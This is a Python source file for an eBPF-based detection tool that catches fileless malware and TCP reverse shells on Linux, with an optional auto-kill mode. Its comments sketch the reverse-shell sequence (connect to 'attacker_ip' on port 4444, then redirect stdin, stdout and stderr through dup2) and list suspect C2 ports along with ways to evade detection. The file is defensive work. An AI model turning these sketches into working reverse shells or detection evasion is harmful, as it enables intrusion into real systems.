#!/usr/bin/env python3
"""
blue_ebpf_mdr_v2.py - eBPF MDR v2: Reverse Shell Detection Upgrade
================================================================================
Upgrades from v1 (blue_ebpf_mdr.py):

  v1 hooks (retained):
    1. sys_enter_memfd_create  → fileless staging
    2. sys_enter_execve        → execution from /proc/fd
    3. sys_enter_socket        → raw ICMP covert channel

  v2 NEW hooks:
    4. sys_enter_connect       → outbound TCP to suspicious ports
    5. sys_enter_dup2          → fd 0/1/2 hijacking (reverse shell pattern)

WHY v2 IS NEEDED:
-----------------
v1 only detects fileless malware that uses memfd_create + ICMP raw sockets.
A standard TCP reverse shell (fork → connect → dup2 → pty.spawn) bypasses
ALL v1 hooks because it never calls memfd_create or opens a raw socket.

v2 catches this with two complementary strategies:

  Strategy 1 — Suspicious Port Detection (Hook 4):
    Monitor connect() calls.  If the destination port matches a known
    C2/shell port (4444, 4445, 5555, etc.), alert and optionally kill.
    Fast detection at connection time.

  Strategy 2 — Reverse Shell Pattern Detection (Hook 5):
    Track dup2() calls per PID.  When a single process redirects all
    three standard file descriptors (stdin=0, stdout=1, stderr=2),
    this is the classic reverse shell pattern.  Alert and optionally kill.
    Catches reverse shells on ANY port, even 80/443.

Requires: Linux >= 5.3, BCC (python3-bpfcc), root

Usage:
  sudo python3 blue_ebpf_mdr_v2.py                          # monitor only
  sudo python3 blue_ebpf_mdr_v2.py --kill                    # detect + kill
  sudo python3 blue_ebpf_mdr_v2.py --kill --suspect-ports 4444,8080
================================================================================
"""
import os
import sys
import ctypes
import struct
import socket
import json
import argparse
import time
import signal
import glob as _glob

# ═══════════════════════════════════════════════════════════════
#  eBPF C Program (v2)
#
#  Includes all v1 hooks plus new connect() and dup2() hooks.
#  See blue_ebpf_mdr.py for detailed explanations of v1 hooks.
# ═══════════════════════════════════════════════════════════════

BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

/* ── Event type constants ────────────────────���───────────── */
#define EVT_MEMFD_CREATE    1   /* v1: memfd_create syscall */
#define EVT_MEMFD_EXEC      2   /* v1: execve from /proc/fd */
#define EVT_ICMP_RAW_SOCK   3   /* v1: raw ICMP socket */
#define EVT_SUSPECT_CONNECT 4   /* v2 NEW: connect to suspicious port */
#define EVT_REVERSE_SHELL   5   /* v2 NEW: dup2 fd hijack pattern */

/* ── Event structure (v2: added port field) ──────────────── */
struct event_t {
    u32 pid;
    u32 ppid;
    u32 uid;
    u8  event_type;
    u8  killed;
    u16 port;              /* v2: destination port for connect events */
    char comm[16];
    char detail[128];
};

BPF_PERF_OUTPUT(events);

/* ── Shared state maps ───────────────────────────────────── */
BPF_HASH(memfd_pids, u32, u64);       /* v1: PIDs that called memfd_create */
BPF_HASH(whitelist, u32, u8);         /* v1: never-kill PIDs */
BPF_HASH(suspect_ports, u16, u8);     /* v2 NEW: suspicious destination ports */
BPF_HASH(dup2_tracker, u32, u8);      /* v2 NEW: bitmask of redirected fds per PID */

/* ── Helpers ──────────────────────────────────────────────��� */
static inline int is_whitelisted(u32 pid) {
    return whitelist.lookup(&pid) != NULL;
}

static inline void fill_common(struct event_t *e, u8 etype) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 uid_gid  = bpf_get_current_uid_gid();
    e->pid        = pid_tgid >> 32;
    e->uid        = uid_gid & 0xFFFFFFFF;
    e->event_type = etype;
    e->killed     = 0;
    e->port       = 0;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    bpf_probe_read_kernel(&e->ppid, sizeof(e->ppid),
                          &task->real_parent->tgid);
}

/* ════════════════════��════════════════════════════════════════
 *  v1 HOOK 1: memfd_create — fileless malware staging
 *  (see blue_ebpf_mdr.py for full explanation)
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_memfd_create) {
    struct event_t e = {};
    fill_common(&e, EVT_MEMFD_CREATE);
    if (is_whitelisted(e.pid)) return 0;

    bpf_probe_read_user_str(e.detail, sizeof(e.detail), args->uname);

    u64 ts = bpf_ktime_get_ns();
    memfd_pids.update(&e.pid, &ts);

    __KILL_MEMFD__

    events.perf_submit(args, &e, sizeof(e));
    return 0;
}

/* ═════════════════════════════════════════════════════════════
 *  v1 HOOK 2: execve — detect execution from /proc/<pid>/fd/*
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
    struct event_t e = {};
    fill_common(&e, EVT_MEMFD_EXEC);
    if (is_whitelisted(e.pid)) return 0;

    char fname[128];
    bpf_probe_read_user_str(fname, sizeof(fname), args->filename);

    if (fname[0] != '/' || fname[1] != 'p' || fname[2] != 'r' ||
        fname[3] != 'o' || fname[4] != 'c' || fname[5] != '/')
        return 0;

    int found = 0;
    for (int i = 6; i < 20; i++) {
        if (fname[i]   == '/' && fname[i+1] == 'f' &&
            fname[i+2] == 'd' && fname[i+3] == '/') {
            found = 1;
            break;
        }
    }
    if (!found) return 0;

    __builtin_memcpy(e.detail, fname, 128);

    __KILL_EXEC__

    events.perf_submit(args, &e, sizeof(e));
    return 0;
}

/* ═════════════════════════════════════════════════════════════
 *  v1 HOOK 3: socket — detect raw ICMP socket creation
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_socket) {
    if (args->family != 2 || args->type != 3 || args->protocol != 1)
        return 0;

    struct event_t e = {};
    fill_common(&e, EVT_ICMP_RAW_SOCK);
    if (is_whitelisted(e.pid)) return 0;

    u64 *t1 = memfd_pids.lookup(&e.pid);
    u64 *t2 = memfd_pids.lookup(&e.ppid);
    if (t1 || t2) {
        __builtin_memcpy(e.detail, "CORRELATED:memfd+icmp", 22);
        __KILL_ICMP_CORR__
    } else {
        __builtin_memcpy(e.detail, "raw_icmp_socket", 16);
    }

    events.perf_submit(args, &e, sizeof(e));
    return 0;
}

/* ═════════════════════════════════════════════════════════════
 *  v2 HOOK 4: connect — detect outbound TCP to suspicious ports
 *
 *  A reverse shell calls:
 *    s = socket(AF_INET, SOCK_STREAM, 0)
 *    s.connect(("attacker_ip", 4444))
 *
 *  This is a normal TCP connect — invisible to v1 hooks.
 *  We read the sockaddr_in structure to extract the destination
 *  port and check it against a configurable suspicious-ports map.
 *
 *  The suspect_ports BPF_HASH is populated from Python at startup
 *  (default: 4444, 4445, 5555, 1234, 1337).
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_connect) {
    struct event_t e = {};
    fill_common(&e, EVT_SUSPECT_CONNECT);
    if (is_whitelisted(e.pid)) return 0;

    /* Read first 8 bytes of sockaddr: [family:2][port:2][addr:4] */
    char sa_buf[8] = {};
    bpf_probe_read_user(sa_buf, sizeof(sa_buf), (void *)args->uservaddr);

    u16 family = *(u16 *)&sa_buf[0];
    if (family != 2) return 0;          /* AF_INET only */

    u16 port_be = *(u16 *)&sa_buf[2];
    u16 port = (port_be >> 8) | ((port_be & 0xFF) << 8);  /* ntohs */

    u8 *is_suspect = suspect_ports.lookup(&port);
    if (!is_suspect) return 0;

    e.port = port;

    /* Store raw IP bytes in detail[0..3] for Python to decode */
    __builtin_memcpy(e.detail, &sa_buf[4], 4);
    __builtin_memcpy(e.detail + 4, "SUSPECT_CONNECT", 16);

    __KILL_CONNECT__

    events.perf_submit(args, &e, sizeof(e));
    return 0;
}

/* ═════════════════════════════════════════════════════════════
 *  v2 HOOK 5: dup2 — detect reverse shell fd hijacking
 *
 *  A reverse shell redirects all three standard file descriptors
 *  to a socket:
 *    os.dup2(sock.fileno(), 0)   ← stdin
 *    os.dup2(sock.fileno(), 1)   ← stdout
 *    os.dup2(sock.fileno(), 2)   ← stderr
 *
 *  We track a per-PID bitmask.  When all three bits are set
 *  (mask == 0x07), we have HIGH CONFIDENCE of a reverse shell.
 *
 *  This catches reverse shells on ANY port — even if the attacker
 *  uses port 80 or 443 to blend with normal traffic.
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_dup2) {
    u32 newfd = args->newfd;
    if (newfd > 2) return 0;   /* Only stdin(0), stdout(1), stderr(2) */

    struct event_t e = {};
    fill_common(&e, EVT_REVERSE_SHELL);
    if (is_whitelisted(e.pid)) return 0;

    /* Update bitmask: set bit for the redirected fd */
    u8 *mask = dup2_tracker.lookup(&e.pid);
    u8 new_mask = mask ? *mask : 0;
    new_mask |= (1 << newfd);
    dup2_tracker.update(&e.pid, &new_mask);

    /* All three standard fds redirected → reverse shell confirmed */
    if (new_mask == 0x07) {
        __builtin_memcpy(e.detail, "REVERSE_SHELL:fd0+fd1+fd2_hijack", 33);

        __KILL_DUP2__

        events.perf_submit(args, &e, sizeof(e));
        dup2_tracker.delete(&e.pid);
    }

    return 0;
}

/* ═════════════════════════════════════════════════════════════
 *  v2 HOOK 6: dup3 — same detection as dup2
 *
 *  Python's os.dup2(fd, fd2, inheritable=False) calls dup3()
 *  instead of dup2().  Without this hook, an attacker could
 *  bypass Hook 5 by passing inheritable=False.
 *
 *  dup3 args: oldfd, newfd, flags (flags typically O_CLOEXEC)
 * ═════════════════════════════════════════════════════════════ */
TRACEPOINT_PROBE(syscalls, sys_enter_dup3) {
    u32 newfd = args->newfd;
    if (newfd > 2) return 0;

    struct event_t e = {};
    fill_common(&e, EVT_REVERSE_SHELL);
    if (is_whitelisted(e.pid)) return 0;

    u8 *mask = dup2_tracker.lookup(&e.pid);
    u8 new_mask = mask ? *mask : 0;
    new_mask |= (1 << newfd);
    dup2_tracker.update(&e.pid, &new_mask);

    if (new_mask == 0x07) {
        __builtin_memcpy(e.detail, "REVERSE_SHELL:fd0+fd1+fd2_hijack", 33);

        __KILL_DUP3__

        events.perf_submit(args, &e, sizeof(e));
        dup2_tracker.delete(&e.pid);
    }

    return 0;
}
"""

# ══════════════════════════════════════���════════════════════════
#  ctypes mirror of struct event_t (v2: includes port field)
# ═══════════════════════════════════════════════════════════════

class Event(ctypes.Structure):
    _fields_ = [
        ('pid',        ctypes.c_uint32),
        ('ppid',       ctypes.c_uint32),
        ('uid',        ctypes.c_uint32),
        ('event_type', ctypes.c_uint8),
        ('killed',     ctypes.c_uint8),
        ('port',       ctypes.c_uint16),
        ('comm',       ctypes.c_char * 16),
        ('detail',     ctypes.c_char * 128),
    ]


EVENT_LABEL = {
    1: 'MEMFD_CREATE',
    2: 'MEMFD_EXEC',
    3: 'ICMP_RAW_SOCK',
    4: 'SUSPECT_CONNECT',     # v2 NEW
    5: 'REVERSE_SHELL',       # v2 NEW
}

SEVERITY_FMT = {
    1: '\033[93mHIGH\033[0m',         # yellow
    2: '\033[91mCRITICAL\033[0m',      # red
    3: '\033[91mCRITICAL\033[0m',
    4: '\033[91mCRITICAL\033[0m',      # v2
    5: '\033[91mCRITICAL\033[0m',      # v2
}

DEFAULT_SUSPECT_PORTS = [4444, 4445, 5555, 1234, 1337]


# ════════════════���═════════════════════════════��════════════════
#  /proc scanner — find already-running memfd processes
#  (same as v1, see blue_ebpf_mdr.py for full explanation)
# ═══════════════════════════════════════════════════════════════

def scan_existing_memfd():
    found = []
    for exe in _glob.glob('/proc/[0-9]*/exe'):
        try:
            target = os.readlink(exe)
            if 'memfd:' in target:
                pid = int(exe.split('/')[2])
                try:
                    comm = open(f'/proc/{pid}/comm').read().strip()
                except OSError:
                    comm = '?'
                found.append((pid, comm, target))
        except OSError:
            continue
    return found


def format_connect_detail(detail_raw: bytes, port: int) -> str:
    """Decode the connect event detail: raw IP bytes + description."""
    try:
        if len(detail_raw) >= 4:
            ip = socket.inet_ntoa(detail_raw[:4])
            return f"connect → {ip}:{port}"
    except (OSError, ValueError):
        pass
    return detail_raw.decode(errors='replace').rstrip('\x00')


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description='Blue Team eBPF MDR Engine v2 (Reverse Shell Detection)')
    ap.add_argument('--kill', action='store_true',
                    help='Auto-kill malicious processes via bpf_send_signal')
    ap.add_argument('--whitelist', type=str, default='',
                    help='Comma-separated PIDs to never kill')
    ap.add_argument('--suspect-ports', type=str,
                    default=','.join(str(p) for p in DEFAULT_SUSPECT_PORTS),
                    help=f'Suspicious ports (default: {DEFAULT_SUSPECT_PORTS})')
    ap.add_argument('--soc-log', type=str, default='',
                    help='Write events to JSONL file for SOC dashboard')
    args = ap.parse_args()

    if os.geteuid() != 0:
        print('[!] eBPF requires root.  Run with: sudo')
        sys.exit(1)

    try:
        from bcc import BPF
    except ImportError:
        print('[!] python3-bpfcc not installed.  Run:')
        print('    sudo apt-get install -y bpfcc-tools python3-bpfcc')
        sys.exit(1)

    # ── Parse suspect ports ─────────────────────────────────
    ports = []
    for s in args.suspect_ports.split(','):
        s = s.strip()
        if s.isdigit():
            ports.append(int(s))

    # ── Inject kill logic ───────────────────────────────���───
    src = BPF_PROGRAM
    if args.kill:
        kill_stmt = 'e.killed = 1; bpf_send_signal(9);'
        src = src.replace('__KILL_MEMFD__',     kill_stmt)
        src = src.replace('__KILL_EXEC__',      kill_stmt)
        src = src.replace('__KILL_ICMP_CORR__', kill_stmt)
        src = src.replace('__KILL_CONNECT__',   kill_stmt)
        src = src.replace('__KILL_DUP2__',      kill_stmt)
        src = src.replace('__KILL_DUP3__',      kill_stmt)
    else:
        src = src.replace('__KILL_MEMFD__',     '')
        src = src.replace('__KILL_EXEC__',      '')
        src = src.replace('__KILL_ICMP_CORR__', '')
        src = src.replace('__KILL_CONNECT__',   '')
        src = src.replace('__KILL_DUP2__',      '')
        src = src.replace('__KILL_DUP3__',      '')

    # ── Banner ───────────────────────────────────────────────
    print('\033[94m')
    print('+' + '=' * 52 + '+')
    print('|   Blue Team  eBPF MDR Engine  v2.0               |')
    print('|   + Reverse Shell & Suspect Port Detection        |')
    print('+' + '=' * 52 + '+')
    print('\033[0m')
    kill_str = ('\033[91mENABLED\033[0m' if args.kill
                else '\033[93mDISABLED (monitor)\033[0m')
    print(f'  Auto-kill : {kill_str}')
    print(f'  Suspect   : {ports}')

    # ── Scan existing memfd processes ────────────────────────
    existing = scan_existing_memfd()
    if existing:
        print(f'\n  \033[91m[!] Found {len(existing)} existing '
              f'memfd process(es):\033[0m')
        for pid, comm, exe in existing:
            print(f'      PID={pid}  COMM={comm}  EXE={exe}')
            if args.kill:
                os.kill(pid, signal.SIGKILL)
                print(f'      \033[91m  -> KILLED\033[0m')
    else:
        print('  Existing  : no memfd processes found (clean)')

    # ── Load eBPF ────────────────────────────────────────────
    print('\n[*] Compiling & loading eBPF probes...')
    b = BPF(text=src)
    print('    tracepoint/syscalls/sys_enter_memfd_create  OK')
    print('    tracepoint/syscalls/sys_enter_execve        OK')
    print('    tracepoint/syscalls/sys_enter_socket         OK')
    print('    tracepoint/syscalls/sys_enter_connect        OK  \033[92m[v2 NEW]\033[0m')
    print('    tracepoint/syscalls/sys_enter_dup2           OK  \033[92m[v2 NEW]\033[0m')
    print('    tracepoint/syscalls/sys_enter_dup3           OK  \033[92m[v2 NEW]\033[0m')

    # ── Populate whitelist ───────────────────────────────────
    wl = b['whitelist']
    wl_pids = set()
    if args.whitelist:
        for s in args.whitelist.split(','):
            s = s.strip()
            if s.isdigit():
                wl_pids.add(int(s))
    wl_pids.add(os.getpid())
    for pid in wl_pids:
        wl[ctypes.c_uint32(pid)] = ctypes.c_uint8(1)
    print(f'  Whitelist : {sorted(wl_pids)}')

    # ── Populate suspect ports map ───────────────────────────
    sp = b['suspect_ports']
    for port in ports:
        sp[ctypes.c_uint16(port)] = ctypes.c_uint8(1)

    # ── Monitoring ───────────────────────────────────────────
    print('\n[*] Monitoring...  (Ctrl+C to stop)\n')
    hdr = (f"{'TIME':<10} {'EVENT':<18} {'SEVERITY':<20} "
           f"{'PID':<8} {'PPID':<8} {'UID':<6} "
           f"{'COMM':<16} {'ACT':<10} DETAIL")
    print(hdr)
    print('\u2500' * 130)

    evt_count = 0
    kill_count = 0

    def on_event(cpu, data, size):
        nonlocal evt_count, kill_count
        e = ctypes.cast(data, ctypes.POINTER(Event)).contents
        evt_count += 1

        label = EVENT_LABEL.get(e.event_type, '?')
        sev   = SEVERITY_FMT.get(e.event_type, 'LOW')
        comm  = e.comm.decode(errors='replace')
        act   = '\033[91mKILLED\033[0m' if e.killed else 'ALERT'
        ts    = time.strftime('%H:%M:%S')

        # Format detail based on event type
        if e.event_type == 4:  # SUSPECT_CONNECT
            det = format_connect_detail(e.detail, e.port)
        else:
            det = e.detail.decode(errors='replace').rstrip('\x00')

        if e.killed:
            kill_count += 1

        print(f'{ts:<10} {label:<18} {sev:<20} '
              f'{e.pid:<8} {e.ppid:<8} {e.uid:<6} '
              f'{comm:<16} {act:<10} {det}')

        # Correlation messages
        if e.event_type == 3 and det.startswith('CORRELATED'):
            print(f'\033[91m    \u2570\u2500\u25b6 '
                  f'CORRELATION: PID {e.pid} = memfd_create + '
                  f'raw ICMP socket \u2192 Fileless C2 confirmed!\033[0m')

        if e.event_type == 5:
            print(f'\033[91m    \u2570\u2500\u25b6 '
                  f'REVERSE SHELL: PID {e.pid} redirected '
                  f'stdin+stdout+stderr \u2192 Shell hijack confirmed!\033[0m')

        if e.event_type == 4:
            print(f'\033[93m    \u2570\u2500\u25b6 '
                  f'SUSPECT PORT: PID {e.pid} connecting to '
                  f'known C2 port {e.port}\033[0m')

        # Write to SOC dashboard log
        if args.soc_log:
            sev_raw = {1: 'HIGH', 2: 'CRITICAL', 3: 'CRITICAL',
                       4: 'CRITICAL', 5: 'CRITICAL'}
            soc_evt = {
                'ts': time.strftime('%Y-%m-%d %H:%M:%S'),
                'source': 'EBPF_v2',
                'event': label,
                'severity': sev_raw.get(e.event_type, 'INFO'),
                'ip': '',
                'comm': comm,
                'action': 'KILLED' if e.killed else 'ALERT',
                'detail': f'PID:{e.pid} PPID:{e.ppid} {det}',
            }
            try:
                with open(args.soc_log, 'a') as f:
                    f.write(json.dumps(soc_evt) + '\n')
            except OSError:
                pass

    b['events'].open_perf_buffer(on_event, page_cnt=64)

    try:
        while True:
            b.perf_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        pass

    print(f'\n[*] MDR v2 stopped.  Events={evt_count}  Kills={kill_count}')


if __name__ == '__main__':
    main()
